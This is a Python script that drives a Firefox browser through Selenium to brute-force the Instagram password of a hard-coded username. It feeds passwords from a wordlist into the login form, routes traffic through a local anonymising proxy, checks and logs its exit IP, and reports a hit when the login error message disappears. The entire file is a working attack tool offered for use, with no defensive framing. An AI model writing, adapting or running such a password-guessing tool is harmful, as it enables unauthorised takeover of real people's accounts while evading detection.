#!/usr/bin/python
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import os
import sys

username = 'redhootcp'
delay = 0
passwords = ['666666']
used_passwords = []

report_file = 'report.log'
used_passwords_file = 'used_passes.txt'
passwords_file = 'wordlist.txt'


def login():
    driver.get('https://www.instagram.com/accounts/login/?force_classic_login')
    assert "Instagram" in driver.title
    elem = driver.find_element_by_name("username")
    elem.clear()
    elem.send_keys(username)
    elem = driver.find_element_by_name("password")
    elem.clear()
    elem.send_keys(password)
    elem.send_keys(Keys.RETURN)
    time.sleep(delay)


def browser_config():
    profile = webdriver.FirefoxProfile()
    profile.set_preference("network.proxy.http", "localhost")
    profile.set_preference("network.proxy.http_port", 8118)
    profile.set_preference("network.proxy.no_proxies_on", "")
    profile.set_preference("network.proxy.ssl", "localhost")
    profile.set_preference("network.proxy.ssl_port", 8118)
    profile.set_preference("network.proxy.type", 1)
    return profile


def get_ip():
    driver.get('https://icanhazip.com/')
    ip_address = driver.page_source
    return ip_address

with open(passwords_file, 'r') as a:
    passwords_queue = a.readlines()
if os.path.isfile(used_passwords_file):
    with open(used_passwords_file, 'r') as b:
        used_passwords = b.readlines()

passwords = [x for x in passwords_queue if x not in used_passwords]

profile = browser_config()
used_passes = open(used_passwords_file, 'a')
driver = webdriver.Firefox(profile)

ip_address = get_ip()

check_text = 'Please enter a correct username and password. Note that both fields are case-sensitive.'

for line in passwords:
    password = line.rstrip()
    login()
    report = open(report_file, 'a')
    print "%s %s %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), password, ip_address)
    report.write("%s %s %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), password, ip_address))
    report.close()

    if check_text not in driver.page_source:
        if 'Page Not Found' in driver.title:
            driver.close()
            sys.exit(1)
        print "FOUND !!! %s" % (password)
        sys.exit(1)
    used_passes.write("%s\n" % password)
used_passes.close()
